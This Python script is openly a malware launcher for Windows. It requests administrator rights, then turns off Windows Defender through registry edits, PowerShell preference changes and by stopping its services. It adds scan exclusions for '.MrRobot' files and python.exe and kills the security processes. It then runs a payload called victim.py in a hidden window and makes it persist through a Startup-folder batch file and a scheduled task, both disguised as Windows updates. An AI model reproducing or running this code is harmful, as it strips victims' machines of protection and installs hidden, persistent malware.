#!/usr/bin/env python3
"""
Windows Defender Bypass & DIRECT Python Victim Execution
Runs victim.py in the same folder
"""

import subprocess
import os
import sys
import time
import ctypes
import psutil
import tempfile


def is_admin():
    """Check if script is running with administrator privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def elevate_privileges():
    """Restart script with administrator privileges"""
    script_path = sys.argv[0]

    batch_content = f"""@echo off
cd /d "%~dp0"
"{sys.executable}" "{script_path}"
pause
"""

    batch_path = os.path.join(tempfile.gettempdir(), "elevate_direct.bat")
    with open(batch_path, 'w') as f:
        f.write(batch_content)

    try:
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", "cmd.exe", f'/c "{batch_path}"', None, 1
        )
    except:
        pass

    sys.exit(0)


def disable_defender():
    """Disable Windows Defender completely"""
    commands = [
        # Disable via registry
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f',

        # Disable via PowerShell
        'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
        'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
        'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
        'powershell -Command "Add-MpPreference -ExclusionExtension \'.MrRobot\'"',
        'powershell -Command "Add-MpPreference -ExclusionProcess \'python.exe\'"',

        # Stop services
        'net stop WinDefend /y',
        'sc config WinDefend start= disabled',
        'net stop WdNisSvc /y',
        'sc config WdNisSvc start= disabled',
    ]

    for cmd in commands:
        try:
            subprocess.run(cmd,
                           shell=True,
                           capture_output=True,
                           timeout=5,
                           creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

    return True


def kill_defender_processes():
    """Kill any remaining Defender processes"""
    targets = ['MsMpEng.exe', 'NisSrv.exe', 'SecurityHealthService.exe', 'smartscreen.exe']

    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'] and proc.info['name'].lower() in [t.lower() for t in targets]:
                proc.kill()
        except:
            pass

    return True


def find_victim_py():
    """Find victim.py in the same folder as this script"""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    victim_path = os.path.join(script_dir, "victim.py")

    if os.path.exists(victim_path):
        print(f"[✓] Found victim.py at: {victim_path}")
        return victim_path

    # Also check current working directory
    cwd = os.getcwd()
    victim_path_cwd = os.path.join(cwd, "victim.py")

    if os.path.exists(victim_path_cwd):
        print(f"[✓] Found victim.py at: {victim_path_cwd}")
        return victim_path_cwd

    print(f"[-] victim.py not found in script directory: {script_dir}")
    print(f"[-] victim.py not found in current directory: {cwd}")
    return None


def install_required_packages():
    """Install required packages for victim.py"""
    packages = ['pycryptodome', 'pillow', 'pygame', 'qrcode', 'tkinter']

    print("[+] Checking/installing required packages...")
    for package in packages:
        try:
            if package == 'tkinter':
                continue  # tkinter is usually built-in

            subprocess.run([sys.executable, "-m", "pip", "install", package, "--quiet"],
                           capture_output=True,
                           timeout=30,
                           creationflags=subprocess.CREATE_NO_WINDOW)
            print(f"[+] Installed/verified: {package}")
        except Exception as e:
            print(f"[-] Failed to install {package}: {e}")

    return True


def run_victim_py_direct():
    """Run victim.py directly"""
    victim_path = find_victim_py()

    if not victim_path:
        print("[-] ERROR: victim.py not found in the same folder!")
        print("[+] Current directory contents:")
        try:
            for item in os.listdir(os.path.dirname(__file__)):
                print(f"    - {item}")
        except:
            pass
        return None

    # Install packages first
    install_required_packages()

    print(f"[+] Executing: {sys.executable} \"{victim_path}\"")

    # Change to victim.py directory
    victim_dir = os.path.dirname(victim_path)
    original_dir = os.getcwd()

    try:
        os.chdir(victim_dir)
        print(f"[+] Changed to directory: {victim_dir}")
    except:
        print(f"[-] Failed to change directory, staying in: {original_dir}")

    # Run victim.py
    try:
        # First try to import and run directly
        print("[+] Attempting direct Python execution...")

        # Add victim directory to Python path
        sys.path.insert(0, victim_dir)

        # Try to run the module directly
        import runpy
        try:
            result = runpy.run_path(victim_path, run_name="__main__")
            print("[+] Direct Python execution completed")
            return 99999  # Return dummy PID for direct execution
        except Exception as e:
            print(f"[-] Direct execution failed: {e}")
            print("[+] Trying subprocess method...")

        # Fallback to subprocess
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE

        process = subprocess.Popen(
            [sys.executable, victim_path],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )

        print(f"[+] victim.py subprocess started (PID: {process.pid})")

        # Check if process is running
        time.sleep(2)

        if process.poll() is None:
            print("[+] victim.py is running successfully")
            return process.pid
        else:
            print("[-] victim.py process terminated immediately")
            # Check for errors
            try:
                result = subprocess.run([sys.executable, victim_path],
                                        capture_output=True,
                                        text=True,
                                        timeout=10)
                print(f"[*] victim.py output: {result.stdout}")
                if result.stderr:
                    print(f"[*] victim.py errors: {result.stderr}")
            except:
                pass
            return None

    except Exception as e:
        print(f"[-] ERROR executing victim.py: {e}")

        # Try one more approach - run with visible window to see errors
        try:
            print("[+] Trying visible execution to see errors...")
            result = subprocess.run([sys.executable, victim_path],
                                    capture_output=True,
                                    text=True,
                                    timeout=15)
            print(f"[*] Exit code: {result.returncode}")
            print(f"[*] Output: {result.stdout[:500]}...")
            if result.stderr:
                print(f"[*] Errors: {result.stderr[:500]}...")
        except Exception as e2:
            print(f"[-] Final attempt failed: {e2}")

        return None
    finally:
        os.chdir(original_dir)


def setup_persistence_for_victim():
    """Set up persistence for victim.py"""
    victim_path = find_victim_py()

    if not victim_path:
        print("[-] Cannot set up persistence - victim.py not found")
        return False

    python_exe = sys.executable
    victim_dir = os.path.dirname(victim_path)

    # Create batch file to run victim
    batch_content = f'''@echo off
cd /d "{victim_dir}"
"{python_exe}" "{victim_path}"
'''

    batch_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup',
                              'SystemUpdate.bat')

    try:
        with open(batch_path, 'w') as f:
            f.write(batch_content)
        print(f"[+] Persistence batch file created: {batch_path}")
    except Exception as e:
        print(f"[-] Failed to create batch file: {e}")
        return False

    # Also create scheduled task
    task_cmd = f'''schtasks /create /tn "WindowsSystemUpdate" /tr "\\"{python_exe}\\" \\"{victim_path}\\"" /sc onlogon /rl highest /f'''

    try:
        result = subprocess.run(task_cmd, shell=True, capture_output=True, text=True,
                                creationflags=subprocess.CREATE_NO_WINDOW)
        if result.returncode == 0:
            print("[+] Scheduled task created successfully")
        else:
            print(f"[-] Scheduled task creation failed: {result.stderr}")
    except Exception as e:
        print(f"[-] Failed to create scheduled task: {e}")

    return True


def main():
    """Main execution"""
    print("=== WINDOWS DEFENDER BYPASS & VICTIM.PY EXECUTION ===\n")

    if not is_admin():
        print("[!] Admin privileges required - elevating...")
        elevate_privileges()
        return

    print("[✓] Running with administrator privileges\n")

    # Step 1: Disable Defender
    print("[1] DISABLING WINDOWS DEFENDER...")
    disable_defender()
    kill_defender_processes()
    print("[✓] Windows Defender disabled\n")

    # Step 2: Find and run victim.py
    print("[2] LOCATING AND EXECUTING victim.py...")
    pid = run_victim_py_direct()

    if pid:
        print(f"[✓] victim.py execution initiated")
        if pid != 99999:
            print(f"[+] Process PID: {pid}")
        print()

        # Step 3: Set up persistence
        print("[3] SETTING UP PERSISTENCE...")
        setup_persistence_for_victim()
        print("[✓] Persistence configured\n")

        # Step 4: Verification
        print("[4] VERIFICATION...")
        print("[+] Waiting 5 seconds for victim.py to initialize...")

        for i in range(5, 0, -1):
            print(f"[+] {i}...")
            time.sleep(1)

        print("\n" + "=" * 50)
        print("[✓] DEPLOYMENT COMPLETE!")
        print("=" * 50)
        print("[+] Windows Defender: DISABLED")
        print("[+] victim.py: EXECUTED")
        print("[+] Persistence: CONFIGURED")
        print("[+] Interface: SHOULD BE VISIBLE (if victim.py launches GUI)")
        print("=" * 50)
    else:
        print("\n[-] FAILED to execute victim.py")
        print("[+] Check that victim.py exists in the same folder")
        print("[+] Verify victim.py has no syntax errors")
        print("[+] Try running victim.py manually: python victim.py")

    # Keep console open
    try:
        input("\nPress Enter to exit...")
    except:
        pass


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"\n[!] Critical error: {e}")
        import traceback

        traceback.print_exc()